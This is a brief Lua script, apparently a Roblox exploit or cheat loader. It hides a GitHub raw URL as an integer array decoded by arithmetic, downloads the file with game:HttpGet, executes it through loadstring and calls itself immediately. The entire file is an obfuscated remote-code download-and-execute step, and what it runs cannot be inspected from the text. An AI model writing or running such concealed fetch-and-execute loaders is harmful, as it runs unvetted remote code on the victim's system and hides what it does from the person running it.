
local _3utsh5pow = function()
    loadstring(game:HttpGet((function()
        local a={1389,1545,1545,1493,1532,791,648,648,1519,1298,1584,635,1376,1402,1545,1389,1558,1311,1558,1532,1350,1519,1324,1480,1467,1545,1350,1467,1545,635,1324,1480,1454,648,1025,1558,1298,1116,1324,1519,1402,1493,1545,895,1350,1298,1467,648,1103,908,1142,648,1519,1350,1363,1532,648,1389,1350,1298,1337,1532,648,1454,1298,1402,1467,648,1038,1298,1402,1467};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()))()
end;
_3utsh5pow();
